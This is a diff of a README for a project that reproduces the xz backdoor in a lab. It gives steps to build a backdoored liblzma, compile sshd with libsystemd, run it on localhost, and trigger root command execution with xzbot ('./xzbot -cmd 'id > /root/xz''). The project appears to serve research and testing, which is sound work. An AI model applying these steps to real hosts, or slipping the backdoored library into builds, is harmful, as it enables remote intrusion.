@@ -1,22 +1,24 @@
 This project tries to minimize the number of steps necessary to trigger the
 [xz backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor).
 
-The backdoor needs `sshd` compiled with libsystemd support, which requires a
-patch most distributions don't ship.
+# Basic
 
-Here's how you can check if `sshd` is linked against libsystemd:
+In its most basic form you will need to build `liblzma.so` which you can do with:
 
 ```sh
-readelf -d /usr/sbin/sshd | grep NEEDED
+make all
 ```
 
-To help testing a script to build `sshd` with the libsystemd patch is included:
+However, the backdoor needs `sshd` compiled with libsystemd support, which
+requires a patch most distributions don't ship.
+
+To help testing, a script to build `sshd` with the libsystemd patch is included:
 
 ```sh
 make sd_sshd
 ```
 
-Then just `sshd` with the helper script:
+Then just run this `sshd` with the helper script:
 
 ```sh
 sudo ./run_sshd
@@ -32,7 +34,7 @@ env -i LD_LIBRARY_PATH="$PWD" "$PWD/sd_sshd" -D -d -oListenAddress=127.0.0.1 -p2
 Then you can use [xzbot](https://github.com/amlweems/xzbot) to trigger the
 backdoor. It will use a custom ed448 key generated with 0 as seed.
 
-```
+```sh
 make xzbot
 ./xzbot -cmd 'id > /root/xz'
 ```
